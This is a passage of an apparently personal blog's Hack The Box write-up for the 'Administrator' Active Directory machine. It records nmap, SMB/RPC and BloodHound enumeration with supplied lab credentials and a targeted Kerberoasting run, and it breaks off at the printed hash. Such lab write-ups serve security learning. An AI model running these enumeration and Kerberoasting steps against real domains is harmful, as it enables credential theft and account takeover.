@@ -1,0 +1,487 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="This is my writeup of Administrator Windows Box From Hack The Box (Meduim)"><title>Administrator HTB Writeup</title><link rel=canonical href=https://r4z1o.github.io/p/administrator-htb-writeup/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="Administrator HTB Writeup"><meta property='og:description' content="This is my writeup of Administrator Windows Box From Hack The Box (Meduim)"><meta property='og:url' content='https://r4z1o.github.io/p/administrator-htb-writeup/'><meta property='og:site_name' content='     R4zi0'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='markdown'><meta property='article:tag' content='css'><meta property='article:tag' content='html'><meta property='article:tag' content='themes'><meta property='article:published_time' content='2025-02-22T00:00:00+00:00'><meta property='article:modified_time' content='2025-02-22T00:00:00+00:00'><meta property='og:image' content='https://r4z1o.github.io/p/administrator-htb-writeup/Administrator.png'><meta name=twitter:title content="Administrator HTB Writeup"><meta name=twitter:description content="This is my writeup of Administrator Windows Box From Hack The Box (Meduim)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://r4z1o.github.io/p/administrator-htb-writeup/Administrator.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_8e81efca82e23b50.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>R4zi0</a></h1><h2 class=site-description>Cyber Security Student | Offensive Security Enthusiast</h2></div></header><ol class=menu-social><li><a href=https://github.com/R4z1o target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/administrator-htb-writeup/><img src=/p/administrator-htb-writeup/Administrator_hu_91c4213ea0a2d87b.png srcset="/p/administrator-htb-writeup/Administrator_hu_91c4213ea0a2d87b.png 800w, /p/administrator-htb-writeup/Administrator_hu_8c38c08388f95c66.png 1600w" width=800 height=303 loading=lazy alt="Featured image of post Administrator HTB Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/themes/>Themes
+</a><a href=/categories/syntax/>Syntax</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/administrator-htb-writeup/>Administrator HTB Writeup</a></h2><h3 class=article-subtitle>This is my writeup of Administrator Windows Box From Hack The Box (Meduim)</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Feb 22, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h2 id=nmap-scan->Nmap Scan :</h2><p>We will start our journey by running an nmap scan on the provided ip address, and the result below show that ports like <code>88</code> for Kerberos and <code>389</code> for LDAP, which indicates that we are dealing with Domain Controller Active Directory Server.</p><p>The results also shows that the domain we are up against is : <code>administrator.htb</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sV -sC -O -Pn --disable-arp-ping -o scan-nmap 10.10.11.42                             
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.42
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.068s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>988</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>21/tcp   open  ftp           Microsoft ftpd
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  SYST: Windows_NT
+</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
+</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-02-22 02:38:36Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
+</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class=o>)</span>.
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN<span class=o>(</span><span class=nv>V</span><span class=o>=</span>7.94SVN%E<span class=o>=</span>4%D<span class=o>=</span>2/21%OT<span class=o>=</span>21%CT<span class=o>=</span>1%CU<span class=o>=</span>36753%PV<span class=o>=</span>Y%DS<span class=o>=</span>2%DC<span class=o>=</span>I%G<span class=o>=</span>Y%TM<span class=o>=</span>67B8
+</span></span><span class=line><span class=cl>OS:D65A%P<span class=o>=</span>x86_64-pc-linux-gnu<span class=o>)</span>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>101%GCD<span class=o>=</span>1%ISR<span class=o>=</span>104%CI<span class=o>=</span>I%II<span class=o>=</span>I%TS<span class=o>=</span>A<span class=o>)</span>SEQ<span class=o>(</span>S
+</span></span><span class=line><span class=cl>OS:P<span class=o>=</span>102%GCD<span class=o>=</span>1%ISR<span class=o>=</span>105%CI<span class=o>=</span>I%TS<span class=o>=</span>A<span class=o>)</span>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>102%GCD<span class=o>=</span>1%ISR<span class=o>=</span>105%CI<span class=o>=</span>I%II<span class=o>=</span>I%TS<span class=o>=</span>A<span class=o>)</span>OP
+</span></span><span class=line><span class=cl>OS:S<span class=o>(</span><span class=nv>O1</span><span class=o>=</span>M53CNW8ST11%O2<span class=o>=</span>M53CNW8ST11%O3<span class=o>=</span>M53CNW8NNT11%O4<span class=o>=</span>M53CNW8ST11%O5<span class=o>=</span>M53CNW
+</span></span><span class=line><span class=cl>OS:8ST11%O6<span class=o>=</span>M53CST11<span class=o>)</span>WIN<span class=o>(</span><span class=nv>W1</span><span class=o>=</span>FFFF%W2<span class=o>=</span>FFFF%W3<span class=o>=</span>FFFF%W4<span class=o>=</span>FFFF%W5<span class=o>=</span>FFFF%W6<span class=o>=</span>FFDC<span class=o>)</span>EC
+</span></span><span class=line><span class=cl>OS:N<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>FFFF%O<span class=o>=</span>M53CNW8NNS%CC<span class=o>=</span>Y%Q<span class=o>=)</span>T1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%S<span class=o>=</span>O%A<span class=o>=</span>S+%F<span class=o>=</span>
+</span></span><span class=line><span class=cl>OS:AS%RD<span class=o>=</span>0%Q<span class=o>=)</span>T2<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>T3<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>T4<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>O%F<span class=o>=</span>R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T5<span class=o>(</span>
+</span></span><span class=line><span class=cl>OS:R<span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>S+%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T6<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>80%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>O%
+</span></span><span class=line><span class=cl>OS:F<span class=o>=</span>R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T7<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>U1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>N%T<span class=o>=</span>80%IPL<span class=o>=</span>164%UN<span class=o>=</span>0%RIPL<span class=o>=</span>G%RID<span class=o>=</span>G%RIPCK<span class=o>=</span>G
+</span></span><span class=line><span class=cl>OS:%RUCK<span class=o>=</span>G%RUD<span class=o>=</span>G<span class=o>)</span>IE<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DFI<span class=o>=</span>N%T<span class=o>=</span>80%CD<span class=o>=</span>Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
+</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-02-22T02:38:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 7h00m00s
+</span></span></code></pre></td></tr></table></div></div><p>Since the description of the box provided us with credentials <code>Olivia:ichliebedich</code> , assuming we have a foothold on the domain, we will use them to enumerate things like <strong>SMB</strong> shares and users which i dogged through each of them but nothing comes handy.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ rpcclient -U <span class=s2>&#34;Olivia%ichliebedich&#34;</span> 10.10.11.42
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>rpcclient $&gt; enumdomusers
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>Administrator<span class=o>]</span> rid:<span class=o>[</span>0x1f4<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>Guest<span class=o>]</span> rid:<span class=o>[</span>0x1f5<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>krbtgt<span class=o>]</span> rid:<span class=o>[</span>0x1f6<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>olivia<span class=o>]</span> rid:<span class=o>[</span>0x454<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>michael<span class=o>]</span> rid:<span class=o>[</span>0x455<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>benjamin<span class=o>]</span> rid:<span class=o>[</span>0x456<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>emily<span class=o>]</span> rid:<span class=o>[</span>0x458<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>ethan<span class=o>]</span> rid:<span class=o>[</span>0x459<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>alexander<span class=o>]</span> rid:<span class=o>[</span>0xe11<span class=o>]</span>
+</span></span><span class=line><span class=cl>user:<span class=o>[</span>emma<span class=o>]</span> rid:<span class=o>[</span>0xe12<span class=o>]</span>
+</span></span><span class=line><span class=cl>rpcclient $&gt; 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo netexec smb 10.10.11.42 -u olivia -p ichliebedich --shares
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> ayoub: 
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:administrator.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> administrator.htb<span class=se>\o</span>livia:ichliebedich 
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               Share           Permissions     Remark
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               -----           -----------     ------
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               C$                              Default share
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               NETLOGON        READ            Logon server share 
+</span></span><span class=line><span class=cl>SMB         10.10.11.42     <span class=m>445</span>    DC               SYSVOL          READ            Logon server share
+</span></span></code></pre></td></tr></table></div></div><p>I tried to access the <code>FTP</code> server, maybe there is something interesting there, but unfortunately we can&rsquo;t login.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ftp 10.10.11.42
+</span></span><span class=line><span class=cl>Connected to 10.10.11.42.
+</span></span><span class=line><span class=cl><span class=m>220</span> Microsoft FTP Service
+</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.10.11.42:ayoub<span class=o>)</span>: olivia
+</span></span><span class=line><span class=cl><span class=m>331</span> Password required
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl><span class=m>530</span> User cannot log in, home directory inaccessible.
+</span></span><span class=line><span class=cl>ftp: Login failed
+</span></span><span class=line><span class=cl>ftp&gt; 
+</span></span></code></pre></td></tr></table></div></div><p>I gathered data using <code>bloodhound-python</code> for a better visibility, and see if there are some interesting Edges that we could take advantages of.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodhound-python -d administrator.htb -u Olivia -p <span class=s1>&#39;ichliebedich&#39;</span> -ns 10.10.11.42  -c all
+</span></span><span class=line><span class=cl>INFO: Found AD domain: administrator.htb
+</span></span><span class=line><span class=cl>INFO: Getting TGT <span class=k>for</span> user
+</span></span><span class=line><span class=cl>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class=o>[</span>Errno Connection error <span class=o>(</span>dc.administrator.htb:88<span class=o>)]</span> <span class=o>[</span>Errno -2<span class=o>]</span> Name or service not known
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.administrator.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> computers
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.administrator.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>11</span> users
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>53</span> groups
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> ous
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
+</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
+</span></span><span class=line><span class=cl>INFO: Querying computer: dc.administrator.htb
+</span></span><span class=line><span class=cl>INFO: Done in 00M 14S
+</span></span></code></pre></td></tr></table></div></div><p>Using the <code>Transitive Object Control</code> built-in query under <strong>OUTBOUND OBJECT CONTROL</strong>, we can see that the user under our control <code>Olivia</code> have <code>GenericAll</code> ACL right on <code>Michael</code> user, and <code>Michael</code> have <code>ForceChangePassword</code> on <code>Benjamin</code> user.</p><p><img src=/p/administrator-htb-writeup/Bloodhound11.png width=962 height=296 srcset="/p/administrator-htb-writeup/Bloodhound11_hu_a9191c29a15cecc1.png 480w, /p/administrator-htb-writeup/Bloodhound11_hu_c5a3fe86e58bb4d6.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=325 data-flex-basis=780px></p><p>Let&rsquo;s first synchronize the time with server because Kerberos authentication is very strict about time calibration. and then take over the <code>Michael</code> user by performing a targeted Kerberoasting.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ntpdate 10.10.11.42                                                            
+</span></span><span class=line><span class=cl>2025-03-29 00:14:36.325066 <span class=o>(</span>+0100<span class=o>)</span> +179778.282233 +/- 0.124255 10.10.11.42 s1 no-leap
+</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 179778.282233
+</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> changed from 2025-03-26 to 2025-03-29
+</span></span></code></pre></td></tr></table></div></div><p>I tried to crack this hash using <code>hashcat</code> but it looks like it&rsquo;s not crackable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ./targetedKerberoast.py -v -d <span class=s1>&#39;administrator.htb&#39;</span> -u <span class=s1>&#39;Olivia&#39;</span> -p <span class=s1>&#39;ichliebedich&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> ayoub: 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting kerberoast attacks
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN added successfully <span class=k>for</span> <span class=o>(</span>michael<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>michael<span class=o>)</span>
